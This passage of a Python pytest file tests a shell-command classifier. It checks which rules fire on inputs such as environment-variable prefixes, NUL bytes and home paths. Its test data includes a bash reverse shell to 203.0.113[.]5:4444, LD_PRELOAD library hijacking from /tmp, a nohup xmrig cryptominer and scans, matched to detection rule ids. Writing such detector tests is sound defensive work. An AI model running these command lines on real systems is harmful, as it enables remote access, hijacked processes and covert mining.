    "LD_PRELOAD=/tmp/.x/l.so whoami", "PATH=/tmp/.x id", "env LD_PRELOAD=/tmp/x.so ./xmrig", "sudo PATH=/tmp/.x id",
    "LD_LIBRARY_PATH=/tmp/.x nmap 203.0.113[.]5", "sudo LD_PRELOAD=/tmp/x.so id", "HOME=/tmp/.x ssh root@10.0.0[.]5",
    "RANDOM=1 whoami", "BASH_ENV=/tmp/.x/e " + BA + " x.sh", "PYTHONPATH=/tmp/.x python3 -c 'import os'",
    "x=1 PATH=/tmp/.x uname -a", "nohup env LD_PRELOAD=/tmp/x.so ./xmrig &",
])
def test_a_loader_prefix_leaves_the_command_to_the_model(library, text):
    rule = library.match(text)
    assert rule is None, rule.id


@pytest.mark.parametrize("text, rule_id", [
    ("LC_ALL=C nmap -sV 203.0.113[.]5", "network-scan"), ("x=1 whoami", "whoami-id"), ("TZ=UTC uname -a", "system-info"),
    ("env FOO=1 ./xmrig", "cryptominer"), ("LD_PRELOAD=/tmp/x.so " + BA + " -i >& /dev/" + "tcp/203.0.113[.]5/4444 0>&1",
                                           "reverse-shell"),
])
def test_other_prefixes_keep_their_rules(library, text, rule_id):
    assert library.match(text).id == rule_id


# 12. A NUL byte. bash file refuses a script with a NUL in its first line (in its first two after #!), but bash < file,
# source, dash and sh run any of them, and bash drops each NUL from a line. A few NULs in otherwise text keep a file
# text: its lines are read, and each record with a NUL goes to the model with a warning. A file that is mostly NULs or
# other controls is still binary.
@pytest.mark.parametrize("raw", [
    b"#!/bin/bash\necho a\x00b\nwhoami\nid\n", b"true\necho a\x00b\nwhoami\nid\n", b"echo a\x00b\nwhoami\nid\n",
])
def test_a_script_with_a_few_nul_bytes_is_read(tmp_path, library, raw):
    path = tmp_path / "x.sh"
    path.write_bytes(raw)
    data = parse_paths([path], now=AT)
    assert data["sources"][0]["rejected"] is None
    texts_ = [line["text"] for line in data["lines"]]
    assert "echo a" + PICTURE_NUL + "b" in texts_ and texts_[-2:] == ["whoami", "id"]
    transcript = Transcript.model_validate(data)
    apply_rules(transcript, library, at=AT)
    nul_line = next(line for line in transcript.lines if PICTURE_NUL in line.text)
    assert nul_line.gloss.source == "pending"
    assert [w for w in data["warnings"] if "left to the model" in w] == [
        f"x.sh: line {nul_line.line}: a blank other than space or tab, or a control character; left to the model"]


@pytest.mark.parametrize("raw, binary", [
    (b"echo a\x00b\nwhoami\n", False), (b"#!/bin/bash\necho a\x00b\n", False), (b"\x00" * 64, True),
    ("echo hi\nwhoami\n".encode("utf-16-le"), True), (b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56, True),
    (b"\x00abc", True), (b"echo hi\n", False),
])
def test_only_a_share_of_controls_makes_a_file_binary(raw, binary):
    assert is_binary(raw) is binary


# A leading ~/ in a test word expands to HOME and a path, which holds a / and so is never an operator: it stays context.
# ~ alone is HOME and ~- is OLDPWD, either of which can be -v.
@pytest.mark.parametrize("text, rule_id", [
    ("[ -f ~/.bashrc ]", "shell-syntax"), ("[ -d ~/projects ] && cd ~/projects", "shell-syntax"),
    ("test -f ~/x", "shell-syntax"), ("[ ~ 'b[x]' ]", None), ("[ ~- x ]", None), ("[ ~root ]", None),
    ("[ a~/b ]", None),
])
def test_a_home_path_in_a_test_stays_context(library, text, rule_id):
    assert context_of(library, text) == rule_id
